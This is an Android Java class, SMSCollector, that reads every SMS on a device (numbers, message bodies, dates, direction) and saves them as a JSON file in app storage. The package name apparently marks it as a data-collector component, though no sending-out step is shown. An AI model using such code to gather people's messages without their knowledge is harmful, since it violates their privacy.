package com.alzahra.collector;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SMSCollector {
    private final Context context;
    public SMSCollector(Context context) { this.context = context; }

    public File export() {
        try {
            JSONArray smsList = new JSONArray();
            Cursor cursor = context.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
            if (cursor == null) return null;
            try {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
                    sms.put("date", sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE)))));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    sms.put("type", type == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "received");
                    smsList.put(sms);
                }
            } finally { cursor.close(); }
            if (smsList.length() == 0) return null;
            File dir = new File(context.getFilesDir(), "exports");
            if (!dir.exists()) dir.mkdirs();
            File file = new File(dir, "sms_" + System.currentTimeMillis() + ".json");
            FileWriter writer = new FileWriter(file);
            writer.write(smsList.toString(2));
            writer.close();
            return file;
        } catch (Exception e) { e.printStackTrace(); return null; }
    }
}
